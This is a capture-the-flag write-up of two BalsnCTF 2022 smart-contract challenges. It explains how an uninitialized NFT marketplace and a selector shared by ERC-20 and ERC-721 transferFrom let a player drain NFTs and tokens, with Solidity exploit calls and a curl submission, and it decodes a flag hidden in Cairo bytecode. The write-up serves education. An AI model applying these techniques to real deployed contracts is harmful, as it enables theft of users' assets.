# BalsnCTF 2022 Smart Contract Challenges Writeup

**Table of Contents**
- [NFT Marketplace](#nft-marketplace)
- [Cairo Reverse](#cairo-reverse)

## NFT Marketplace
[Full Exploit Code](NFTMarketplace)

The goal of this challenge is to execute the `verify` function of the NFT marketplace and emit the `GetFlag` event.

To prevent the revert of the `verify` function of the NFT marketplace, the following three `require` statement conditions need to be satisfied.

```solidity
function verify() public {
    require(nmToken.balanceOf(address(this)) == 0, "failed");
    require(nmToken.balanceOf(msg.sender) > 1000000, "failed");
    require(
        rareNFT.ownerOf(1) == msg.sender && rareNFT.ownerOf(2) == msg.sender && rareNFT.ownerOf(3) == msg.sender
            && rareNFT.ownerOf(4) == msg.sender
    );
    emit GetFlag(true);
}
```

Conditions
1. Reduce the NM Token balance of the NFT marketplace to `0`.
2. Make the NM Token balance of `msg.sender` greater than `1000000`.
3. Own all Rare NFTs with `tokenId` of `1`,`2`,`3`, and `4` to `msg.sender`.

The following two vulnerabilities can be used to satisfy these conditions.
- Functions executable in an uninitialized state
- Transfer of ERC-20 tokens via `_safeTransferFrom` for ERC-721 tokens

### Functions executable in an uninitialized state
The `initialize` function of the NFT marketplace can be executed once at any time, and the `createOrder` function can be executed before that `initialize` function is executed.
The `_safeTransferFrom` function used in `createOrder` is implemented as follows.

```solidity
function _safeTransferFrom(address token, address from, address to, uint256 tokenId) internal {
    bool success;
    bytes memory data;

    assembly {
        // we'll write our calldata to this slot below, but restore it later
        let memPointer := mload(0x40)
        // write the abi-encoded calldata into memory, beginning with the function selector
        mstore(0, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
        mstore(4, from) // append the 'from' argument
        mstore(36, to) // append the 'to' argument
        mstore(68, tokenId) // append the 'tokenId' argument

        success :=
            and(
                // set success to whether the call reverted, if not we check it either
                // returned exactly 1 (can't just be non-zero data), or had no return data
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                // we use 100 because that's the total length of our calldata (4 + 32 * 3)
                // - counterintuitively, this call() must be positioned after the or() in the
                // surrounding and() because and() evaluates its arguments from right to left
                call(gas(), token, 0, 0, 100, 0, 32)
            )
        data := returndatasize()

        mstore(0x60, 0) // restore the zero slot to zero
        mstore(0x40, memPointer) // restore the memPointer
    }
    if (!success) {
        revert TransferFromFailed();
    }
}
```

It uses the `call` opcode internally, but if the target address called by the `call` opcode is an EOA, the `call` always succeeds.
Any `createOrder` can be executed for any EOA without the Rare NFT transfer if it is before the `initialize` function is executed.

This vulnerability can be exploited to take away an NFT by performing the following steps.
1. Execute the `createOrder` function of an NFT you do not own to the address of the undeployed Rare NFT contract.
2. Execute the `initialize` function.
3. Execute the `cancelOrder` function for the order created in step 1.

The address of the Rare NFT contract can be pre-computed as follows because the `create2` opcode is used.
```solidity
library Create2 {
    function getAddress(address creator, bytes32 salt, bytes memory bytecode, bytes memory encodedArgs) internal pure returns(address) {
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xff), creator, salt, keccak256(abi.encodePacked(bytecode, encodedArgs)))
        ))));
    }
}
```
```solidity
address rareNFTAddress = Create2.getAddress(
    address(nftMarketplace),
    keccak256("rareNFT"),
    nftMarketplace.getNFTVersion(),
    abi.encode("Rare NFT", "rareNFT")
);
```

The following code can take away Rare NFTs whose `tokenId` is `1`, `2`, and `3`.

```solidity
uint256 orderId = nftMarketplace.createOrder(rareNFTAddress, 1, 0);
nftMarketplace.createOrder(rareNFTAddress, 2, 0);
nftMarketplace.createOrder(rareNFTAddress, 3, 0);
nftMarketplace.initialize();
nftMarketplace.cancelOrder(orderId);
nftMarketplace.cancelOrder(orderId + 1);
nftMarketplace.cancelOrder(orderId + 2);
```

### Transfer of ERC-20 tokens via `safeTransferFrom` for ERC-721 tokens

To take away the NM Token, an ERC-20 token, use the `fulfillTest` function.

```solidity
function fulfillTest(address token, uint256 tokenId, uint256 price) public {
    require(!tested, "Tested");
    tested = true;
    uint256 orderId = NFTMarketplace(this).createOrder(token, tokenId, price);
    fulfill(orderId);
}
```

This function can do two things.
- Although we have already got Rare NFTs, get them by specifying `1`, `2`, or `3` in `tokenId`.
- Set `token` to a non-NFT token address. For example, the NM Token or our custom token.

Actually, if `token` is set to the address of the NM Token and `tokenId` is set to its amount, it is possible to transfer the NM Tokens from the NFT marketplace to the player by the amount of the NM Token.
For example, think about how `nftMarketplace.fulfillTest(address(nftMarketplace.nmToken()), 1000000, 0);` will be executed.

In the `createOrder` function, the following procedures are executed.
- `orders.push(Order(<nftMarketplace address>, <nmToken address>, 1000000, 0))`
- `_safeTransferFrom(<nmToken address>, <nftMarketplace address>, <nftMarketplace address>, 1000000)`

In the `fulfill` function, the following procedures are executed.
- `_safeTransferFrom(<nmToken address>, <nftMarketplace address>, <player addrses>, 1000000);`

In the `_safeTransferFrom` function, the function with its function selector `0x23b872dd` is called for the target address.
The function signature is `_transferFrom(address,address,uint256)`.

```sh
$ cast 4 0x23b872dd
transferFrom(address,address,uint256)
```

A function with this function signature exists not only in ERC-721 tokens but also in ERC-20 tokens, which can be executed without `_safeTransferFrom` revert.

The `tranferFrom` function of the ERC-721 token:
```solidity
function transferFrom(
    address from,
    address to,
    uint256 tokenId
) public virtual override {
    //solhint-disable-next-line max-line-length
    require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    _transfer(from, to, tokenId);
}
```

The `tranferFrom` function of the ERC-20 token:
```solidity
function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
}
```

Therefore, all the NM Tokens that the NFT marketplace has can be taken away, and all the conditions to clear this challenge can be satisfied.

The following commands get the flag.
```sh
BYTECODE=$(forge inspect src/BalsnCTF2022/NFTMarketplace/Exploit.sol:Exploit bytecode)
curl -v http://nft-marketplace.balsnctf.com:3000/exploit -X POST --header "Content-Type: application/json" -d "{\"bytecode\": \"$BYTECODE\"}"
```

Flag: `BALSN{safeTransferFrom_ERC20_to_ERC721}`

## Cairo Reverse
[Full Exploit Code](CairoReverse)

`t` is included in the `program` of the contract.

```
...
    "program": {
        "attributes": [],
        "builtins": [
            "pedersen",
            "range_check"
        ],
        "data": [
            "0x482680017ffd8000",
            "0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e",
            "0x20680017fff7fff",
            "0x9",
            "0x484a7ffd7ffd8000",
            "0x480a7ffa7fff8000",
            "0x480a7ffb7fff8000",
            "0x480a7ffc7fff8000",
            "0x482480017ffc8000",
            "0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4",
            "0x208b7fff7fff7ffe",
            "0x480a7ffa7fff8000",
            "0x480a7ffb7fff8000",
            "0x480a7ffc7fff8000",
            "0x480680017fff8000",
...
```

Decode `t` from the `felt` type.

```python
from Crypto.Util.number import long_to_bytes

x = 0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4
y = 0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e
p = 0x800000000000011000000000000000000000000000000000000000000000001
t = y - p

flag = long_to_bytes(x + t ** 2)
print(flag)
```

Flag: `BALSN{read_data_from_cairo}`